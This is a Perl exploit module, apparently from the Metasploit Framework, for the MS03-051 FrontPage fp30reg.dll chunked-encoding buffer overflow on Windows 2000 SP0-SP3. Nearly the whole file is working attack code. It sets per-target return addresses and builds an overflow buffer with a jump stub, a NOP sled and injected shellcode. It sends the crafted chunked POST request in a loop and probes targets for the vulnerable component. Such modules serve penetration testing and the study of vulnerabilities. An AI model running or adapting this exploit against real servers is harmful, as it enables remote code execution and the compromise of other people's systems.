package Msf::Exploit::frontpage_fp30reg_chunked;
use base "Msf::Exploit";
use strict;

my $advanced = { }; 

my $info =
{
    'Name'  => 'Frontpage fp30reg.dll Chunked Encoding',
    'Version'  => '$Revision: 1.19 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 1024,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
               },
    
    'Description'  => qq{
        This is an exploit for the chunked encoding buffer overflow
        described in MS03-051 and originally reported by Brett
        Moore. This particular modules works against versions of
        Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
        issue.
    },
              
    'Refs'  =>  [  
                    'http://www.osvdb.org/577',
		            'http://www.microsoft.com/technet/security/bulletin/ms03-051.mspx'
                ],
    'DefaultTarget' => 0,
    'Targets' => [
                   ['Windows 2000 SP0-SP3',  0x6c38a4d0],   # from mfc42.dll
                   ['Windows 2000 07/22/02', 0x67d44eb1],   # from fp30reg.dll 07/22/2002
                   ['Windows 2000 10/06/99', 0x67d4665d],   # from fp30reg.dll 10/06/1999
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;

    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
  
    my @targets;
    my @offsets;
    my $pad;

    my $ret = defined($target_idx) ? ($self->Targets->[ $target_idx ]->[1]) : $self->Targets->[0]->[1];
    my $pattern = Pex::PatternCreate(0xDEAD);
    
    my $count = 0;
    while (1)
    {
        if ($count % 3 == 0)
        {
            $self->PrintLine("[*] Refreshing remote process...");
            my $res = $self->Check();
            $count = 0;
        }

        substr($pattern, 128, 4, pack("V", $ret));
        substr($pattern, 264, 4, pack("V", $ret));
        substr($pattern, 160, 7, "\x2d\xff\xfe\xff\xff" . "\xff\xe0");
        substr($pattern, 280, 512, "\x90" x 512);
        substr($pattern, 792, length($shellcode), $shellcode);

        my $request;
        $request  = "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";
        $request .= "Host: $target_host:$target_port\r\n";
        $request .= "Transfer-Encoding: chunked\r\n";
        $request .= "\r\n";
        $request .= "DEAD\r\n";
        $request .= $pattern . "\r\n";
        $request .= "0\r\n";

        my $s = Msf::Socket->new( {"SSL" => $self->GetVar('SSL')} );
        if (! $s->Tcp($target_host, $target_port))
        {
            $self->FatalError("Could not connect: " . $s->GetError());
            return;
        }

        $self->PrintLine("[*] Sending exploit request...");
        $s->Send($request);
        sleep(1);
        $s->Close();
        $count++;
    }
    return;
}

sub Check {
    my ($self) = @_;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    
    my $getreq = "GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n".
                 "Host: $target_host:$target_port\r\n\r\n";
 
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar('SSL')} );
    
    if (! $s)
    {
       $self->PrintLine("[*] Could not create the socket");
       return(0);
    }
    
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Could not connect: " . $s->GetError());
        return(0);
    }
    
    $s->Send($getreq);
    my $res = $s->Recv(-1, 10);
    $s->Close();
    
    if ($res !~ /501 Not Implemented/)
    {
        $self->PrintLine("[*] Frontpage component was not found");
        return(0);
    }

    $self->PrintLine("[*] Frontpage component found");
    return(1);

}

